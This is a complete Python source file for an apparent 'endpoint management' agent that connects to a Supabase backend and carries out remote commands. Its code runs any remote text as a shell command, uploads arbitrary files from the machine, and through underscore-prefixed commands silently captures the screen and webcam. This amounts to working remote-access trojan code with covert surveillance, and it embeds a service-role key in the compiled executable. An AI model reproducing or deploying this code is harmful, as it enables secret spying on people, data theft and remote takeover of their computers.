#!/usr/bin/env python3
"""
DeskMan Endpoint Agent
Runs on managed endpoints to communicate with the Supabase backend.
Registers with the server, sends heartbeats, and executes management commands.

Usage (development):
    python deskman_agent.py --url <SUPABASE_URL> --key <SERVICE_ROLE_KEY>

Usage (compiled EXE):
    deskman_agent.exe
    (credentials are embedded at build time via build.py)
"""

import argparse
import datetime
import io
import json
import os
import platform
import shutil
import socket
import subprocess
import sys
import threading
import time
import uuid

try:
    from supabase import create_client, Client
except ImportError:
    print("Error: supabase-py is required. Install with: pip install supabase")
    sys.exit(1)

# ============ CONFIGURATION ============

HEARTBEAT_INTERVAL = 30  # seconds
COMMAND_POLL_INTERVAL = 2  # seconds
AGENT_ID_FILE = ".deskman_agent_id"


def _load_embedded_config():
    """Try to load build-time embedded configuration."""
    try:
        from embedded_config import (
            SUPABASE_URL,
            SUPABASE_KEY,
            HEARTBEAT_INTERVAL as HB,
            COMMAND_POLL_INTERVAL as CP,
        )
        if SUPABASE_URL and SUPABASE_URL != "__SUPABASE_URL__":
            return SUPABASE_URL, SUPABASE_KEY, HB, CP
    except ImportError:
        pass
    return None, None, None, None


# ============ AGENT CLASS ============

class DeskManAgent:
    def __init__(self, supabase_url: str, supabase_key: str):
        self.supabase: Client = create_client(supabase_url, supabase_key)
        self.supabase_url = supabase_url
        self.agent_id = self._load_or_create_agent_id()
        self.hostname = platform.node()
        self.username = self._get_username()
        self.ip_address = self._get_ip()
        self.os_info = self._get_os_info()
        self.running = True

    def _load_or_create_agent_id(self) -> str:
        """Load existing agent ID or generate one unique to this machine.

        The ID is derived from hardware identifiers (machine-id / MAC address)
        so the same physical PC always gets the same agent ID, even if the
        EXE is re-downloaded or the ID file is deleted.  Different PCs will
        always produce different IDs.
        """
        id_path = os.path.join(os.path.expanduser("~"), AGENT_ID_FILE)
        if os.path.exists(id_path):
            with open(id_path, "r") as f:
                stored = f.read().strip()
                if stored:
                    return stored

        # Build a stable machine fingerprint
        fingerprint = self._get_machine_fingerprint()
        agent_id = f"AGT-{fingerprint[:8].upper()}"

        try:
            with open(id_path, "w") as f:
                f.write(agent_id)
        except OSError:
            pass  # non-fatal: ID still works, just won't persist
        return agent_id

    @staticmethod
    def _get_machine_fingerprint() -> str:
        """Produce a deterministic hex string unique to this machine."""
        import hashlib

        parts = []

        # 1. Try OS-level machine ID (Linux: /etc/machine-id, Windows: MachineGuid)
        if platform.system() == "Windows":
            try:
                import winreg
                reg = winreg.OpenKey(
                    winreg.HKEY_LOCAL_MACHINE,
                    r"SOFTWARE\Microsoft\Cryptography",
                )
                guid, _ = winreg.QueryValueEx(reg, "MachineGuid")
                winreg.CloseKey(reg)
                parts.append(guid)
            except Exception:
                pass
        else:
            for p in ("/etc/machine-id", "/var/lib/dbus/machine-id"):
                try:
                    with open(p) as f:
                        parts.append(f.read().strip())
                    break
                except OSError:
                    pass

        # 2. Fallback: MAC address of the primary NIC
        try:
            mac = uuid.getnode()
            if mac and mac != uuid.getnode():
                pass  # getnode() may return random if no MAC found
            parts.append(str(mac))
        except Exception:
            pass

        # 3. Hostname as additional entropy
        parts.append(platform.node())

        raw = "|".join(parts)
        return hashlib.sha256(raw.encode()).hexdigest()[:12]

    def _get_username(self) -> str:
        try:
            return os.getlogin()
        except OSError:
            import getpass
            return getpass.getuser()

    def _get_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    def _get_os_info(self) -> str:
        return f"{platform.system()} {platform.release()} {platform.machine()}"

    def _get_system_info(self) -> dict:
        info = {
            "hostname": self.hostname,
            "username": self.username,
            "os": self.os_info,
            "platform": platform.platform(),
            "python_version": platform.python_version(),
            "cpu_count": os.cpu_count(),
            "home_dir": os.path.expanduser("~"),
        }
        try:
            import psutil
            mem = psutil.virtual_memory()
            info["total_memory_gb"] = round(mem.total / (1024 ** 3), 2)
            info["cpu_percent"] = psutil.cpu_percent(interval=1)
            disk = psutil.disk_usage("/")
            info["disk_total_gb"] = round(disk.total / (1024 ** 3), 2)
            info["disk_free_gb"] = round(disk.free / (1024 ** 3), 2)
        except ImportError:
            pass
        return info

    # ============ REGISTRATION ============

    def register(self):
        """Register or update this agent in the database."""
        system_info = self._get_system_info()

        # Upsert agent record
        data = {
            "agent_id": self.agent_id,
            "hostname": self.hostname,
            "username": self.username,
            "ip_address": self.ip_address,
            "os_info": self.os_info,
            "status": "online",
            "last_seen": datetime.datetime.utcnow().isoformat(),
            "system_info": system_info,
        }

        try:
            self.supabase.table("agents").upsert(data, on_conflict="agent_id").execute()
            print(f"[+] Registered as {self.agent_id} ({self.hostname})")
        except Exception as e:
            print(f"[-] Registration failed: {e}")
            raise

    # ============ HEARTBEAT ============

    def send_heartbeat(self):
        """Update last_seen timestamp and status."""
        try:
            self.supabase.table("agents").update({
                "status": "online",
                "last_seen": datetime.datetime.utcnow().isoformat(),
                "ip_address": self._get_ip(),
            }).eq("agent_id", self.agent_id).execute()
        except Exception as e:
            print(f"[-] Heartbeat failed: {e}")

    def heartbeat_loop(self):
        """Background thread for periodic heartbeats."""
        while self.running:
            self.send_heartbeat()
            time.sleep(HEARTBEAT_INTERVAL)

    # ============ COMMAND POLLING ============

    def poll_commands(self):
        """Check for pending commands and execute them."""
        while self.running:
            try:
                result = self.supabase.table("commands").select("*").eq(
                    "agent_id", self.agent_id
                ).eq("status", "pending").order("created_at").execute()

                for cmd in result.data or []:
                    self._process_command(cmd)
            except Exception as e:
                print(f"[-] Command poll error: {e}")

            time.sleep(COMMAND_POLL_INTERVAL)

    def _process_command(self, cmd: dict):
        """Execute a single command and report results."""
        command_id = cmd["id"]
        command_text = cmd["command"]
        print(f"[*] Executing: {command_text}")

        # Mark as running
        try:
            self.supabase.table("commands").update({
                "status": "running"
            }).eq("id", command_id).execute()
        except Exception:
            pass

        # Route to handler
        output = ""
        exit_code = 0
        try:
            lower_cmd = command_text.lower().strip()

            if lower_cmd == "whoami":
                output = self.username
            elif lower_cmd == "hostname":
                output = self.hostname
            elif lower_cmd == "osinfo":
                output = self._get_os_info()
            elif lower_cmd == "sysinfo":
                output = json.dumps(self._get_system_info(), indent=2)
            elif lower_cmd == "netinfo":
                output = self._cmd_netinfo()
            elif lower_cmd == "uptime":
                output = self._cmd_uptime()
            elif lower_cmd == "processes":
                output = self._cmd_processes()
            elif lower_cmd == "drives":
                output = self._cmd_drives()
            elif lower_cmd.startswith("ls"):
                path = command_text[2:].strip() or os.getcwd()
                output = self._cmd_ls(path)
            elif lower_cmd == "__screenshot":
                output = self._cmd_screenshot()
            elif lower_cmd == "__webcam":
                output = self._cmd_webcam()
            elif lower_cmd.startswith("download "):
                filepath = command_text[9:].strip()
                output = self._cmd_download(filepath)
            elif lower_cmd.startswith("shell "):
                shell_cmd = command_text[6:].strip()
                output, exit_code = self._cmd_shell(shell_cmd)
            elif lower_cmd.startswith("cd "):
                path = command_text[3:].strip()
                output = self._cmd_cd(path)
            else:
                # Default: try as shell command
                output, exit_code = self._cmd_shell(command_text)

        except Exception as e:
            output = f"Error: {str(e)}"
            exit_code = 1

        # Report result
        try:
            self.supabase.table("command_results").insert({
                "command_id": command_id,
                "agent_id": self.agent_id,
                "output": output,
                "exit_code": exit_code,
            }).execute()

            self.supabase.table("commands").update({
                "status": "completed" if exit_code == 0 else "failed",
                "completed_at": datetime.datetime.utcnow().isoformat(),
            }).eq("id", command_id).execute()
        except Exception as e:
            print(f"[-] Failed to report result: {e}")

    # ============ COMMAND HANDLERS ============

    def _cmd_netinfo(self) -> str:
        try:
            if platform.system() == "Windows":
                result = subprocess.run(
                    ["ipconfig"], capture_output=True, text=True, timeout=10
                )
                return result.stdout
            else:
                lines = []
                result = subprocess.run(
                    ["ip", "addr"], capture_output=True, text=True, timeout=10
                )
                if result.returncode == 0:
                    lines.append(result.stdout)
                result2 = subprocess.run(
                    ["ip", "route"], capture_output=True, text=True, timeout=10
                )
                if result2.returncode == 0:
                    lines.append(result2.stdout)
                return "\n".join(lines) if lines else "Could not retrieve network info"
        except Exception as e:
            return f"Error getting network info: {e}"

    def _cmd_uptime(self) -> str:
        try:
            import psutil
            boot = datetime.datetime.fromtimestamp(psutil.boot_time())
            delta = datetime.datetime.now() - boot
            days = delta.days
            hours, rem = divmod(delta.seconds, 3600)
            minutes, _ = divmod(rem, 60)
            return f"System uptime: {days} days, {hours} hours, {minutes} minutes"
        except ImportError:
            if platform.system() != "Windows":
                result = subprocess.run(
                    ["uptime", "-p"], capture_output=True, text=True, timeout=10
                )
                return result.stdout.strip() if result.returncode == 0 else "Unknown"
            return "psutil not installed - cannot determine uptime"

    def _cmd_processes(self) -> str:
        try:
            import psutil
            procs = []
            for p in psutil.process_iter(["pid", "name", "cpu_percent", "memory_percent"]):
                info = p.info
                procs.append(info)
            procs.sort(key=lambda x: x.get("cpu_percent", 0) or 0, reverse=True)
            lines = ["PID      CPU%   MEM%   NAME"]
            for p in procs[:30]:
                lines.append(
                    f"{str(p['pid']).ljust(8)} "
                    f"{str(round(p.get('cpu_percent', 0) or 0, 1)).ljust(6)} "
                    f"{str(round(p.get('memory_percent', 0) or 0, 1)).ljust(6)} "
                    f"{p.get('name', 'unknown')}"
                )
            return "\n".join(lines)
        except ImportError:
            if platform.system() != "Windows":
                result = subprocess.run(
                    ["ps", "aux", "--sort=-pcpu"],
                    capture_output=True, text=True, timeout=10,
                )
                lines = result.stdout.strip().split("\n")
                return "\n".join(lines[:31])
            return "psutil not installed"

    def _cmd_drives(self) -> str:
        try:
            import psutil
            parts = psutil.disk_partitions()
            lines = ["DEVICE          MOUNT        FSTYPE    TOTAL     FREE"]
            for p in parts:
                try:
                    usage = psutil.disk_usage(p.mountpoint)
                    total = f"{round(usage.total / (1024**3), 1)}G"
                    free = f"{round(usage.free / (1024**3), 1)}G"
                except Exception:
                    total = free = "N/A"
                lines.append(
                    f"{p.device.ljust(15)} {p.mountpoint.ljust(12)} "
                    f"{p.fstype.ljust(9)} {total.ljust(9)} {free}"
                )
            return "\n".join(lines)
        except ImportError:
            if platform.system() != "Windows":
                result = subprocess.run(
                    ["df", "-h"], capture_output=True, text=True, timeout=10
                )
                return result.stdout if result.returncode == 0 else "Cannot list drives"
            return "psutil not installed"

    def _cmd_ls(self, path: str) -> str:
        """List directory and upload structured listing to file_listings table."""
        path = os.path.expanduser(path)
        if not os.path.isdir(path):
            return f"Not a directory: {path}"

        entries = []
        try:
            for name in sorted(os.listdir(path)):
                full = os.path.join(path, name)
                try:
                    stat = os.stat(full)
                    is_dir = os.path.isdir(full)
                    size = "-" if is_dir else self._format_size(stat.st_size)
                    mtime = datetime.datetime.fromtimestamp(stat.st_mtime).strftime(
                        "%Y-%m-%d %H:%M"
                    )
                    file_type = "folder" if is_dir else self._get_file_type(name)
                    entries.append({
                        "name": name,
                        "type": file_type,
                        "size": size,
                        "date": mtime,
                    })
                except (PermissionError, OSError):
                    entries.append({
                        "name": name,
                        "type": "unknown",
                        "size": "-",
                        "date": "-",
                    })
        except PermissionError:
            return f"Permission denied: {path}"

        # Upload structured listing for the file manager UI
        try:
            self.supabase.table("file_listings").upsert({
                "agent_id": self.agent_id,
                "path": path,
                "entries": entries,
                "updated_at": datetime.datetime.utcnow().isoformat(),
            }, on_conflict="agent_id,path").execute()
        except Exception as e:
            print(f"[-] Failed to upload file listing: {e}")

        # Also return text output for the console
        lines = [f"Directory: {path}\n"]
        for e in entries:
            prefix = "[DIR] " if e["type"] == "folder" else "      "
            lines.append(f"  {prefix}{e['name'].ljust(40)} {e['size'].ljust(12)} {e['date']}")
        lines.append(f"\nTotal: {len(entries)} items")
        return "\n".join(lines)

    def _cmd_screenshot(self) -> str:
        """Capture screenshot and upload to Supabase Storage."""
        try:
            import mss
            from PIL import Image

            with mss.mss() as sct:
                monitor = sct.monitors[0]  # All monitors combined
                screenshot = sct.grab(monitor)
                img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")

                buf = io.BytesIO()
                img.save(buf, format="PNG")
                buf.seek(0)

                filename = f"{self.agent_id}/{datetime.datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.png"
                self.supabase.storage.from_("screenshots").upload(
                    filename, buf.getvalue(),
                    file_options={"content-type": "image/png"}
                )

                # Insert metadata
                self.supabase.table("screenshots").insert({
                    "agent_id": self.agent_id,
                    "storage_path": filename,
                    "width": img.width,
                    "height": img.height,
                }).execute()

                return f"Screenshot captured ({img.width}x{img.height})"
        except ImportError:
            return "Screenshot requires mss and Pillow packages. Install with: pip install mss Pillow"
        except Exception as e:
            return f"Screenshot failed: {e}"

    def _cmd_webcam(self) -> str:
        """Capture webcam image and upload to Supabase Storage."""
        try:
            import cv2

            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                return "No webcam detected"

            ret, frame = cap.read()
            cap.release()

            if not ret:
                return "Failed to capture webcam frame"

            _, buf = cv2.imencode(".png", frame)
            h, w = frame.shape[:2]

            filename = f"{self.agent_id}/webcam_{datetime.datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.png"
            self.supabase.storage.from_("screenshots").upload(
                filename, buf.tobytes(),
                file_options={"content-type": "image/png"}
            )

            self.supabase.table("screenshots").insert({
                "agent_id": self.agent_id,
                "storage_path": filename,
                "width": w,
                "height": h,
            }).execute()

            return f"Webcam captured ({w}x{h})"
        except ImportError:
            return "Webcam requires opencv-python. Install with: pip install opencv-python"
        except Exception as e:
            return f"Webcam capture failed: {e}"

    def _cmd_download(self, filepath: str) -> str:
        """Upload a file from the endpoint to Supabase Storage for download."""
        filepath = os.path.expanduser(filepath)
        if not os.path.isfile(filepath):
            return f"File not found: {filepath}"

        try:
            filename = os.path.basename(filepath)
            storage_path = f"{self.agent_id}/files/{filename}"

            with open(filepath, "rb") as f:
                self.supabase.storage.from_("screenshots").upload(
                    storage_path, f.read(),
                    file_options={"content-type": "application/octet-stream"}
                )

            size = os.path.getsize(filepath)
            return f"File uploaded: {filename} ({self._format_size(size)})\nStorage path: {storage_path}"
        except Exception as e:
            return f"Download failed: {e}"

    def _cmd_shell(self, cmd: str) -> tuple:
        """Execute a shell command and return (output, exit_code)."""
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60,
            )
            output = result.stdout
            if result.stderr:
                output += "\n" + result.stderr if output else result.stderr
            return output.strip() or "(no output)", result.returncode
        except subprocess.TimeoutExpired:
            return "Command timed out (60s limit)", 1
        except Exception as e:
            return f"Shell error: {e}", 1

    def _cmd_cd(self, path: str) -> str:
        """Change working directory."""
        path = os.path.expanduser(path)
        try:
            os.chdir(path)
            return f"Changed directory to: {os.getcwd()}"
        except Exception as e:
            return f"Failed to change directory: {e}"

    # ============ UTILITIES ============

    def _format_size(self, size: int) -> str:
        for unit in ["B", "KB", "MB", "GB", "TB"]:
            if size < 1024:
                return f"{size:.1f} {unit}" if unit != "B" else f"{size} B"
            size /= 1024
        return f"{size:.1f} PB"

    def _get_file_type(self, filename: str) -> str:
        ext = os.path.splitext(filename)[1].lower()
        types = {
            ".txt": "Text", ".md": "Markdown", ".log": "Log",
            ".pdf": "PDF", ".doc": "Word", ".docx": "Word",
            ".xls": "Excel", ".xlsx": "Excel",
            ".ppt": "PowerPoint", ".pptx": "PowerPoint",
            ".png": "Image", ".jpg": "Image", ".jpeg": "Image", ".gif": "Image",
            ".zip": "Archive", ".rar": "Archive", ".7z": "Archive", ".tar": "Archive", ".gz": "Archive",
            ".exe": "Executable", ".msi": "Installer",
            ".html": "HTML", ".css": "CSS", ".js": "JavaScript",
            ".py": "Python", ".json": "JSON", ".xml": "XML", ".yaml": "YAML", ".yml": "YAML",
            ".sh": "Shell", ".bat": "Batch", ".ps1": "PowerShell",
        }
        return types.get(ext, "File")

    # ============ SHUTDOWN ============

    def shutdown(self):
        """Mark agent as offline and stop loops."""
        self.running = False
        try:
            self.supabase.table("agents").update({
                "status": "offline",
                "last_seen": datetime.datetime.utcnow().isoformat(),
            }).eq("agent_id", self.agent_id).execute()
            print(f"[*] Agent {self.agent_id} marked offline")
        except Exception:
            pass

    # ============ MAIN RUN ============

    def run(self):
        """Main entry point: register, start heartbeat, poll commands."""
        print(f"[*] DeskMan Agent v1.0")
        print(f"[*] Agent ID: {self.agent_id}")
        print(f"[*] Hostname: {self.hostname}")
        print(f"[*] IP: {self.ip_address}")
        print(f"[*] OS: {self.os_info}")
        print(f"[*] Backend: {self.supabase_url}")
        print()

        self.register()

        # Start heartbeat thread
        heartbeat_thread = threading.Thread(target=self.heartbeat_loop, daemon=True)
        heartbeat_thread.start()
        print(f"[+] Heartbeat started (every {HEARTBEAT_INTERVAL}s)")

        # Start command polling
        print(f"[+] Command polling started (every {COMMAND_POLL_INTERVAL}s)")
        print(f"[+] Agent running. Press Ctrl+C to stop.\n")

        try:
            self.poll_commands()
        except KeyboardInterrupt:
            print("\n[*] Shutting down...")
            self.shutdown()
            print("[*] Goodbye.")


# ============ ENTRY POINT ============

def main():
    global HEARTBEAT_INTERVAL, COMMAND_POLL_INTERVAL

    # Try embedded config first (compiled EXE mode)
    emb_url, emb_key, emb_hb, emb_cp = _load_embedded_config()

    if emb_url:
        # Running as compiled EXE with baked-in credentials
        print("[*] Using embedded configuration")
        HEARTBEAT_INTERVAL = emb_hb or HEARTBEAT_INTERVAL
        COMMAND_POLL_INTERVAL = emb_cp or COMMAND_POLL_INTERVAL
        agent = DeskManAgent(emb_url, emb_key)
        agent.run()
    else:
        # Development mode — require CLI args
        parser = argparse.ArgumentParser(description="DeskMan Endpoint Agent")
        parser.add_argument(
            "--url", required=True,
            help="Supabase project URL (e.g., https://xxx.supabase.co)"
        )
        parser.add_argument(
            "--key", required=True,
            help="Supabase service_role key"
        )
        parser.add_argument(
            "--heartbeat", type=int, default=HEARTBEAT_INTERVAL,
            help=f"Heartbeat interval in seconds (default: {HEARTBEAT_INTERVAL})"
        )
        parser.add_argument(
            "--poll", type=int, default=COMMAND_POLL_INTERVAL,
            help=f"Command poll interval in seconds (default: {COMMAND_POLL_INTERVAL})"
        )

        args = parser.parse_args()
        HEARTBEAT_INTERVAL = args.heartbeat
        COMMAND_POLL_INTERVAL = args.poll

        agent = DeskManAgent(args.url, args.key)
        agent.run()


if __name__ == "__main__":
    main()
